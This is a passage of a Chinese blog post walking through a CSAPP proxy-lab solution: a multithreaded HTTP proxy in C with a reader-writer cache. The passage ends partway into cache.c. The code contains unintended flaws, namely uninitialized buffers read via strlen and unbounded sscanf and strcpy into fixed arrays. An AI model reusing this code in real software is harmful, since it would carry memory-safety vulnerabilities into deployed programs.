</span><br><span class="line">    	flag = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    P(&amp;cache-&gt;mutex);</span><br><span class="line">    cache-&gt;readers--;</span><br><span class="line">    <span class="keyword">if</span> (cache-&gt;readers == <span class="number">0</span>) <span class="comment">// 是否是最后一个读者</span></span><br><span class="line">    	V(&amp;cache-&gt;w);</span><br><span class="line">    V(&amp;cache-&gt;mutex);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>cache_search_index</strong> 函数根据参数 uri 索引缓存中对应的缓存行，具体实现如下</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">cache_search_index</span><span class="params">(cache *cache, <span class="type">char</span> *uri)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; cache-&gt;n; ++i) &#123;</span><br><span class="line">    	<span class="keyword">if</span> (cache-&gt;buf[i].vaild &amp;&amp; !<span class="built_in">strcmp</span>(cache-&gt;buf[i].uri, uri)) &#123;	<span class="comment">// 缓存行有效且 uri 相同</span></span><br><span class="line">    	    <span class="keyword">return</span> i;</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="doit-1"><a href="#doit-1" class="headerlink" title="doit"></a>doit</h2><ul>
<li>doit 函数相比于之前就只是新增了一个逻辑：如果缓存命中就直接将缓存中对应的 response 发送给客户端，否则再构建请求行和请求报头发送给服务器、接收服务器的响应</li>
<li>一个细节是我们必须先复制一份 uri 的副本，因为 parse_uri 会改变 uri，而接下来的 echo 函数中会用到原来的 uri</li>
<li>具体实现如下</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">doit</span><span class="params">(<span class="type">int</span> fd)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[MAXLINE], method[MAXLINE], uri[MAXLINE], version[MAXLINE];</span><br><span class="line">    <span class="type">char</span> hostname[MAXLINE], port[MAXLINE], filename[MAXLINE];</span><br><span class="line">    <span class="type">char</span> uritemp[MAXLINE];</span><br><span class="line">    <span class="type">rio_t</span> rio;</span><br><span class="line">    </span><br><span class="line">    Rio_readinitb(&amp;rio, fd);</span><br><span class="line">    Rio_readlineb(&amp;rio, buf, MAXLINE); <span class="comment">// 读取请求行</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">sscanf</span>(buf, <span class="string">&quot;%s %s %s&quot;</span>, method, uri, version);</span><br><span class="line">    <span class="keyword">if</span> (strcasecmp(method, <span class="string">&quot;GET&quot;</span>)) &#123;	<span class="comment">// 只能处理 GET 方法</span></span><br><span class="line">    	<span class="keyword">return</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="built_in">strcpy</span>(uritemp, uri);	<span class="comment">// 由于 uri 会在 parse_uri 中被改变，这里是必须的</span></span><br><span class="line">   </span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> (cache_read(&amp;mycache, fd, uritemp) != <span class="number">0</span>) &#123;	<span class="comment">// 如果缓存命中</span></span><br><span class="line">    	<span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    parse_uri(uri, hostname, port, filename);	<span class="comment">// 解析 uri</span></span><br><span class="line">    </span><br><span class="line">    <span class="type">char</span> requesthdrs[MAXLINE];</span><br><span class="line">    build_requesthdrs(&amp;rio, requesthdrs, filename, hostname);	<span class="comment">// 构建请求行和请求报头</span></span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> severfd = Open_clientfd(hostname, port);	<span class="comment">// 得到和服务器连接的描述符</span></span><br><span class="line">    <span class="keyword">if</span> (severfd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">&quot;connection faild\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    Rio_writen(severfd, requesthdrs, <span class="built_in">strlen</span>(requesthdrs));	<span class="comment">// 将请求行和请求报头发送给服务器</span></span><br><span class="line">    </span><br><span class="line">    echo(severfd, fd, uritemp);	<span class="comment">// 处理服务器的响应</span></span><br><span class="line">    </span><br><span class="line">    Close(severfd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="echo-1"><a href="#echo-1" class="headerlink" title="echo"></a>echo</h2><ul>
<li><p>echo 函数的不同就在于我们在将服务器的响应发送到客户端的同时累积到 response 中。如果 response &lt; 最大 Web 对象的 size，就 cache_write 到缓存中</p>
</li>
<li><p>一个细节是我们必须时刻记录 response 累积时的长度，因为如果 len &gt; MAX_OBJECT_SIZE 就会写入到非法的地址空间，从而导致错误（测试通不过）</p>
</li>
<li><p>具体实现如下</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">echo</span><span class="params">(<span class="type">int</span> severfd, <span class="type">int</span> clientfd, <span class="type">char</span> *uri)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[MAXLINE];</span><br><span class="line">    <span class="type">char</span> response[MAX_OBJECT_SIZE];</span><br><span class="line">    <span class="type">rio_t</span> rio;</span><br><span class="line">    Rio_readinitb(&amp;rio, severfd);</span><br><span class="line">    <span class="type">size_t</span> n, len = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> ((n = Rio_readlineb(&amp;rio, buf, MAXLINE)) != <span class="number">0</span>) &#123;</span><br><span class="line">    	Rio_writen(clientfd, buf, n);</span><br><span class="line">    	len += n;	</span><br><span class="line">    	<span class="keyword">if</span> (len &lt; MAX_OBJECT_SIZE) </span><br><span class="line">    	    <span class="built_in">sprintf</span>(response + <span class="built_in">strlen</span>(response), <span class="string">&quot;%.*s&quot;</span>, (<span class="type">int</span>)n, buf);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len &lt; MAX_OBJECT_SIZE) &#123;</span><br><span class="line">    	cache_write(&amp;mycache, uri, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Test-2"><a href="#Test-2" class="headerlink" title="Test"></a>Test</h2><ul>
<li>通过 <strong>make</strong> 重新编译程序，**.&#x2F;driver.sh** 进行测试，测试结果如下</li>
</ul>
<img src="/2024/04/15/CSAPP-Lab8/image-20240419094029889.png" class="" title="image-20240419094029889">

<ul>
<li>第三阶段的 15 分拿下！</li>
</ul>
<h2 id="Result-2"><a href="#Result-2" class="headerlink" title="Result"></a>Result</h2><ul>
<li><strong>proxy.c</strong> 代码如下</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;csapp.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;sbuf.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;cache.h&quot;</span></span></span><br><span class="line"><span class="comment">/* Recommended max cache and object sizes */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_CACHE_SIZE 1049000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_OBJECT_SIZE 102400</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CACHESIZE 10</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NTHREADS 4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SBUFSIZE 16</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* You won&#x27;t lose style points for including this long line in your code */</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">char</span> *user_agent_hdr = <span class="string">&quot;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.3) Gecko/20120305 Firefox/10.0.3\r\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">doit</span><span class="params">(<span class="type">int</span> fd)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">parse_uri</span><span class="params">(<span class="type">char</span> *uri, <span class="type">char</span> *hostname, <span class="type">char</span> *port, <span class="type">char</span> *filename)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">build_requesthdrs</span><span class="params">(<span class="type">rio_t</span> *rio, <span class="type">char</span> *requesthdrs, <span class="type">char</span> *filename, <span class="type">char</span> *hostname)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">echo</span><span class="params">(<span class="type">int</span> severfd, <span class="type">int</span> clientfd, <span class="type">char</span> *uri)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sigpipe_handler</span><span class="params">(<span class="type">int</span> sig)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">sbuf_t</span> sbuf;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">thread</span><span class="params">(<span class="type">void</span> *vargp)</span></span><br><span class="line">&#123;</span><br><span class="line">    Pthread_detach(pthread_self());	<span class="comment">// 可分离</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    	<span class="type">int</span> connfd = sbuf_remove(&amp;sbuf);</span><br><span class="line">    	doit(connfd);</span><br><span class="line">    	Close(connfd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cache mycache;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> listenfd, connfd;</span><br><span class="line">    <span class="type">socklen_t</span> clientlen;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_storage</span> <span class="title">clientaddr</span>;</span></span><br><span class="line">    <span class="type">pthread_t</span> tid;	<span class="comment">// 线程 id</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line">    	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;usage: %s &lt;port&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    Signal(SIGPIPE, sigpipe_handler);</span><br><span class="line">    listenfd = Open_listenfd(argv[<span class="number">1</span>]);</span><br><span class="line">    </span><br><span class="line">    sbuf_init(&amp;sbuf, SBUFSIZE);			<span class="comment">// 初始化 sbuf</span></span><br><span class="line">    cache_init(&amp;mycache, CACHESIZE);	<span class="comment">// 初始化 cache</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NTHREADS; ++i) &#123;	<span class="comment">// 创建 NTHREADS 个线程，线程例程为 thread</span></span><br><span class="line">    	Pthread_create(&amp;tid, <span class="literal">NULL</span>, thread, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    	clientlen = <span class="keyword">sizeof</span>(clientaddr);</span><br><span class="line">    	connfd = Accept(listenfd, (SA *)&amp;clientaddr, &amp;clientlen);</span><br><span class="line">    	sbuf_insert(&amp;sbuf, connfd);	<span class="comment">// 将得到的和客户端连接的描述符插入到缓冲区</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">doit</span><span class="params">(<span class="type">int</span> fd)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[MAXLINE], method[MAXLINE], uri[MAXLINE], version[MAXLINE];</span><br><span class="line">    <span class="type">char</span> hostname[MAXLINE], port[MAXLINE], filename[MAXLINE];</span><br><span class="line">    <span class="type">char</span> uritemp[MAXLINE];</span><br><span class="line">    <span class="type">rio_t</span> rio;</span><br><span class="line">    </span><br><span class="line">    Rio_readinitb(&amp;rio, fd);</span><br><span class="line">    Rio_readlineb(&amp;rio, buf, MAXLINE); <span class="comment">// 读取请求行</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">sscanf</span>(buf, <span class="string">&quot;%s %s %s&quot;</span>, method, uri, version);</span><br><span class="line">    <span class="keyword">if</span> (strcasecmp(method, <span class="string">&quot;GET&quot;</span>)) &#123;	<span class="comment">// 只能处理 GET 方法</span></span><br><span class="line">    	<span class="keyword">return</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="built_in">strcpy</span>(uritemp, uri);	<span class="comment">// 由于 uri 会在 parse_uri 中被改变，这里是必须的</span></span><br><span class="line">   </span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> (cache_read(&amp;mycache, fd, uritemp) != <span class="number">0</span>) &#123;	<span class="comment">// 如果缓存命中</span></span><br><span class="line">    	<span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    parse_uri(uri, hostname, port, filename);	<span class="comment">// 解析 uri</span></span><br><span class="line">    </span><br><span class="line">    <span class="type">char</span> requesthdrs[MAXLINE];</span><br><span class="line">    build_requesthdrs(&amp;rio, requesthdrs, filename, hostname);	<span class="comment">// 构建请求行和请求报头</span></span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> severfd = Open_clientfd(hostname, port);	<span class="comment">// 得到和服务器连接的描述符</span></span><br><span class="line">    <span class="keyword">if</span> (severfd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">&quot;connection faild\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    Rio_writen(severfd, requesthdrs, <span class="built_in">strlen</span>(requesthdrs));	<span class="comment">// 将请求行和请求报头发送给服务器</span></span><br><span class="line">    </span><br><span class="line">    echo(severfd, fd, uritemp);	<span class="comment">// 处理服务器的响应</span></span><br><span class="line">    </span><br><span class="line">    Close(severfd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">parse_uri</span><span class="params">(<span class="type">char</span> *uri, <span class="type">char</span> *hostname, <span class="type">char</span> *port, <span class="type">char</span> *filename)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *ptr_h;</span><br><span class="line">    <span class="keyword">if</span> ((ptr_h = <span class="built_in">strstr</span>(uri, <span class="string">&quot;//&quot;</span>))) &#123; <span class="comment">// 有 hostname</span></span><br><span class="line">    	<span class="type">char</span> *ptr_p;</span><br><span class="line">    	</span><br><span class="line">        <span class="keyword">if</span> ((ptr_p = index(ptr_h, <span class="string">&#x27;:&#x27;</span>))) &#123; <span class="comment">// 有 port</span></span><br><span class="line">    	    <span class="type">char</span> *ptr_f = index(ptr_p, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    	    <span class="built_in">strcpy</span>(filename, ptr_f);</span><br><span class="line">    	    *ptr_f = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    	    </span><br><span class="line">            <span class="built_in">strcpy</span>(port, ptr_p + <span class="number">1</span>);</span><br><span class="line">    	    *ptr_p = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    	    <span class="built_in">strcpy</span>(hostname, ptr_h + <span class="number">2</span>); </span><br><span class="line">    	</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// 没有 port</span></span><br><span class="line">    	    <span class="type">char</span> *ptr_f = index(ptr_h + <span class="number">2</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    	    <span class="built_in">strcpy</span>(filename, ptr_f);</span><br><span class="line">    	    *ptr_f = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    	    </span><br><span class="line">            <span class="built_in">strcpy</span>(hostname, ptr_h + <span class="number">2</span>);</span><br><span class="line">    	    <span class="built_in">strcpy</span>(port, <span class="string">&quot;80&quot;</span>);</span><br><span class="line">    	&#125;</span><br><span class="line">    </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;	<span class="comment">// 没有 hostname，也没有 port</span></span><br><span class="line">    	<span class="built_in">strcpy</span>(filename, uri);</span><br><span class="line">    	<span class="built_in">strcpy</span>(hostname, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    	<span class="built_in">strcpy</span>(port, <span class="string">&quot;80&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">build_requesthdrs</span><span class="params">(<span class="type">rio_t</span> *rio, <span class="type">char</span> *requesthdrs, <span class="type">char</span> *filename, <span class="type">char</span> *hostname)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[MAXLINE], host_hdrs[MAXLINE], other_hdrs[MAXLINE];</span><br><span class="line">    <span class="type">char</span> *conn_hdrs = <span class="string">&quot;Connection: close\r\n&quot;</span>, *proxy_hdrs = <span class="string">&quot;Proxy-Connection: close\r\n&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">sprintf</span>(requesthdrs, <span class="string">&quot;GET %s HTTP/1.0\r\n&quot;</span>, filename); <span class="comment">// 请求行</span></span><br><span class="line">    </span><br><span class="line">    Rio_readlineb(rio, buf, MAXLINE);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 请求报头</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">strcmp</span>(buf, <span class="string">&quot;\r\n&quot;</span>)) &#123;	<span class="comment">// 还没有读到空行</span></span><br><span class="line">    	</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;Host&quot;</span>)) &#123;	<span class="comment">// 读到 Host 报头</span></span><br><span class="line">            <span class="built_in">sprintf</span>(host_hdrs, <span class="string">&quot;%s&quot;</span>, buf);</span><br><span class="line">    	</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strstr</span>(buf, <span class="string">&quot;User-Agent&quot;</span>) &amp;&amp; !<span class="built_in">strstr</span>(buf, <span class="string">&quot;Connection&quot;</span>) &amp;&amp; !<span class="built_in">strstr</span>(buf, <span class="string">&quot;Proxy&quot;</span>)) &#123;</span><br><span class="line">            <span class="comment">// 不是 user、connection、proxy 报头就追加到 other 报头</span></span><br><span class="line">            <span class="built_in">sprintf</span>(other_hdrs + <span class="built_in">strlen</span>(other_hdrs), <span class="string">&quot;%s&quot;</span>, buf);</span><br><span class="line">    	&#125;</span><br><span class="line">    	</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strlen</span>(host_hdrs) == <span class="number">0</span>) &#123;	<span class="comment">// 没有读到 Host 报头，则一定在 uri 中</span></span><br><span class="line">    	    <span class="built_in">sprintf</span>(requesthdrs + <span class="built_in">strlen</span>(requesthdrs), <span class="string">&quot;Host: %s\r\n&quot;</span>, hostname);</span><br><span class="line">    	&#125;</span><br><span class="line">    	</span><br><span class="line">    	Rio_readlineb(rio, buf, MAXLINE);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 别忘了添加空行</span></span><br><span class="line">    <span class="built_in">sprintf</span>(requesthdrs + <span class="built_in">strlen</span>(requesthdrs), <span class="string">&quot;%s%s%s%s\r\n&quot;</span>, user_agent_hdr, conn_hdrs, proxy_hdrs, other_hdrs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">echo</span><span class="params">(<span class="type">int</span> severfd, <span class="type">int</span> clientfd, <span class="type">char</span> *uri)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[MAXLINE];</span><br><span class="line">    <span class="type">char</span> response[MAX_OBJECT_SIZE];</span><br><span class="line">    <span class="type">rio_t</span> rio;</span><br><span class="line">    Rio_readinitb(&amp;rio, severfd);</span><br><span class="line">    <span class="type">size_t</span> n, len = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> ((n = Rio_readlineb(&amp;rio, buf, MAXLINE)) != <span class="number">0</span>) &#123;</span><br><span class="line">    	Rio_writen(clientfd, buf, n);</span><br><span class="line">    	len += n;	</span><br><span class="line">    	<span class="keyword">if</span> (len &lt; MAX_OBJECT_SIZE) </span><br><span class="line">    	    <span class="built_in">sprintf</span>(response + <span class="built_in">strlen</span>(response), <span class="string">&quot;%.*s&quot;</span>, (<span class="type">int</span>)n, buf);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len &lt; MAX_OBJECT_SIZE) &#123;</span><br><span class="line">    	cache_write(&amp;mycache, uri, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>cache.c</strong> 代码如下</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;cache.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">cache_init</span><span class="params">(cache *cache, <span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    cache-&gt;buf 